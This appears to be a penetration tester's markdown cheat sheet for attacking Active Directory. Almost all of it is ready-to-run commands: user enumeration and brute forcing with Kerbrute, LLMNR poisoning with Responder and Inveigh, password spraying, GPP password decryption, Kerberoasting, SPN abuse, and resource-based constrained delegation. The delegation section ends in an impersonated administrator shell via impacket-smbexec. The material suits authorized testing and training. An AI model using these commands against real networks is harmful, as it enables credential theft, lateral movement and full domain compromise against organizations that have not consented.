### Enumerate all internal DNS records in a Domain
https://github.com/dirkjanm/adidnsdump
```
adidnsdump -u DOMAIN\\USERNAME ldap://IP 
```

### Decrypt cpassword  from GPO
```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

### Ping sweep
```
fping -asgq IP/SUBNET
```
Via Powershell
```
1..254 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```
CMD
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
BASH
```
for i in {1..254} ;do (ping 192.168.1.$i -c 1 -w 5  >/dev/null && echo "192.168.1.$i" &) ;done
```

### Username Bruteforcing
Use this name-list:
https://github.com/insidetrust/statistically-likely-usernames
Brute thru with Kerbrute:
```
kerbrute userenum -d FQDN --dc DCIP jsmith.txt -o valid_ad_users.txt
```

### LL-MNR Sniffing
Run Responder in Sniffing mode(Linux ONLY)
```
sudo responder -I INTERFACE
```
Or same with Inveigh(Windows ONLY)
```
git clone https://github.com/Kevin-Robertson/Inveigh.git
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Get Password policy 
```
netexec smb IP -u USER -p PASSWORD --pass-pol
```

### Password spray
```
sudo netexec smb IP -u valid_users.txt -p Password123 | grep +
```
(This will check a password over many usernames)

### Laps Enumeration
https://github.com/leoloobeek/LAPSToolkit
```
Import-Module .\LAPSToolkit.ps1
```
//Get all PC with LAPS enabled
```
Get-LAPSComputers
```
//Get all the AD groups that can read the laps passwd
```
Find-LAPSDelegatedGroups
```
//Check thru all the PC with laps enabled for users with Extended rights
```
Find-AdmPwdExtendedRights
```

### How to Kerberoast
1)Find Kerberoastable accounts: 
```
impacket-GetUserSPNs -dc-ip XXX.XXX.XXX.XXX domain/username
```
2)Hashdump of the account(user from step 1): 
```
impacket-GetUserSPNs -dc-ip XXX.XXX.XXX.XXX domain/username -request-user **kerberoastable_user**
```


### How to execute a extensive checks
```
powershell -ep bypass
. .\powerup.ps
Invoke-AllChecks
```


### Kerberoasting
//List TGS ticket(Linux ONLY)
```
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
//Requesting all TGS Tickets(Linux ONLY)
```
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
//Dump all User's Kerberoast with Rubeus(Windows ONLY)
```
.\Rubeus.exe kerberoast
```


### GenericWrite over a user
If you find youself having GenericWriteover a user you can 
Reference: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#force-set-spn
1)Check that user have no SPN
```
Get-DomainUser -Identity <UserName> | select serviceprincipalname
```
2)Setup a fake SPN for that user
```
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
```
3)Kerberoast the user and crack it hash to get his password


### GenericWrite over PC
Create fake account
```
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Add appropriate permissions
```
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
Check that it worked
```
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity

----------------------------------------
{1, 0, 4, 128...} 
```
Ask for a new token from kerberos so we can use as impersonation
```
impacket-getST -dc-ip <IP> -impersonate <Admin_Account> -spn cifs/<victim_FQDN>
```
Export kerberos ticket
```
export KRB5CCNAME=<path to administrator.ccache>
```
Get a shell with saved kerberos ticket(Administrator impersonation)
```
impacket-smbexec <domain>/<impersonated account>@<>Victim IP> -no-pass -k
```


### Getting UAC permissions via Powerview
![](attachment/35d402bec0eec6739defba7b55ca56cb.png)
```powershell-session
 Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
```